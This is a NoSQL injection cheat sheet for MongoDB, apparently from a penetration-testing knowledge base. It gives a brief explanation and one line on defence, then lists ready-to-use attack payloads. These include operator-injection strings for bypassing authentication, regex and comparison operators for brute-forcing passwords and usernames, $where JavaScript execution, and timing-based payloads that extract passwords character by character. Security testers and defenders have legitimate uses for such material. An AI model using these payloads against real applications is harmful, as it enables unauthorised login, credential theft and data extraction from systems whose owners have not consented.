# NoSQL injection

### Whats NoSQL Injection

NoSQL Injection diverges from SQL Injection primarily due to differences in query syntax and execution. Unlike SQL databases, NoSQL databases utilize varied query formats, such as JSON or XML, leading to distinct attack vectors.

In SQL Injection, attackers exploit vulnerabilities by injecting SQL commands into input fields. In contrast, NoSQL Injection manipulates input data to disrupt query execution within NoSQL databases, often bypassing traditional sanitization checks.

SQL Injection typically targets the database engine, while NoSQL Injection may occur at different layers of the application stack, depending on the database API and data model.

For instance, consider login queries. In SQL, a query might be:

```sql
SELECT * FROM users WHERE user = '$username' AND pass = '$password'
```

In MongoDB, using JSON-like syntax, the equivalent query would be:

```javascript
db.users.find({user: username, pass: password});
```

In MongoDB, parameters are passed within a `find()` function, without quotation marks, reflecting the database's distinct syntax.

To defend against NoSQL Injection, implement robust input validation, parameterized queries, and context-aware sanitization techniques tailored to the database's query format. Understanding these nuances is crucial to fortify applications against evolving security threats.

### Syntax Injection Test Cases:

1. **Testing Query Syntax**:
   * Submit fuzz strings and special characters to test query syntax.
   * Example Payload: `'"{;$Foo}$Foo \xYZ`
2. **Determining Processed Characters**:
   * Inject individual characters to identify syntax interpretation.
   * Example Payload: `'`
3. **Confirming Conditional Behavior**:
   * Test false and true conditions to observe differences in application behavior.
   * Example Payloads:
     * False Condition: `' && 0 && 'x`
     * True Condition: `' && 1 && 'x`
4. **Overriding Conditions**:
   * Inject conditions that always evaluate to true to exploit vulnerabilities.
   * Example Payload: `'%27%7c%7c%31%7c%7c%27`

#### Operator Injection Test Cases:

1. **Submitting Query Operators**:
   * Insert query operators via JSON messages or URL parameters.
   *   Example Payload:&#x20;

       `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
2. **Extracting Data Using Operators**:
   * Utilize query operators to manipulate queries and extract data.
   *   Example Payload:&#x20;

       `{"username":"admin","password":{"$regex":"^.*"}}`
3. **Testing Field Names**:
   * Identify valid fields in the collection to extract data.
   * Example Payloads:
     * Existing Field: `admin' && this.username!='`
     * Non-existent Field: `admin' && this.foo!='`
4. **Injecting Operators for JavaScript Execution**:
   * Use injected operators to execute JavaScript and extract data.
   * Example Payload: `"$where":"Object.keys(this)[0].match('^.{0}a.*')"`
5. **Timing-Based Injection**:
   * Trigger time delays to detect and exploit vulnerabilities.
   *   Example Payload:&#x20;

       `admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`

### General Guidelines:

* **Adaptation**: Customize payloads based on specific application contexts.
* **Encoding**: Encode payloads as necessary, particularly for URL-based injections.
* **Validation**: Verify responses for changes/error messages indicating successful exploitation.

### Payloads

* Operator Injection

```mongodb
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```

* #### Basic authentication bypass <a href="#basic-authentication-bypass" id="basic-authentication-bypass"></a>

```mongodb
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

* Mongodb Payloads

```mongodb
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```
